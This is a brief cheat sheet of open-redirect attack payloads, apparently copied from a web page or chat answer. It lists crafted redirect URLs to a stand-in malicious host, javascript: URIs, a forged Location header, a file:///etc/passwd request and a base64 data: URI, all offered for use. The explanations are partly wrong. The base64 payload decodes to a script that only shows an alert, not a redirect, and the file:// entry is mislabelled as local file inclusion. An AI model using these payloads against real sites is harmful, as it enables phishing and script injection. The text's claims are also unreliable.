Basic Open Redirect

bash
Copy
http://example.com/redirect?url=http://malicious-site.com
Using URL-encoded Redirection

perl
Copy
http://example.com/redirect?url=http%3A%2F%2Fmalicious-site.com
Double Redirection (Chained Redirects)

bash
Copy
http://example.com/redirect?url=http://example.com/redirect?url=http://malicious-site.com
Redirect to External URL (query parameter-based)

bash
Copy
http://example.com/redirect?target=https://malicious-site.com
Using JavaScript for Redirection

pgsql
Copy
http://example.com/redirect?url=javascript:window.location='http://malicious-site.com'
Redirection with Fragment Identifiers

bash
Copy
http://example.com/redirect?url=http://malicious-site.com#phishing
More Advanced Open Redirect Payloads
These payloads take advantage of HTTP headers or specific parameters to induce redirection.

Using window.location in the Location Header (for XSS/Open Redirect)

pgsql
Copy
HTTP/1.1 301 Moved Permanently
Location: javascript:window.location='http://malicious-site.com'
File Protocol for Local File Redirection (Local File Inclusion exploit)

perl
Copy
http://example.com/redirect?url=file:///etc/passwd
Redirect via Base64 Encoding

bash
Copy
http://example.com/redirect?url=data:text/html;base64,PGh0bWw+PHNjcmlwdD5hbGVydCgnUGhpbnlmaWxsIGZyb20gdGVzdCcpPC9zY3JpcHQ+PC9odG1sPg==
This would encode JavaScript that redirects to a malicious site.
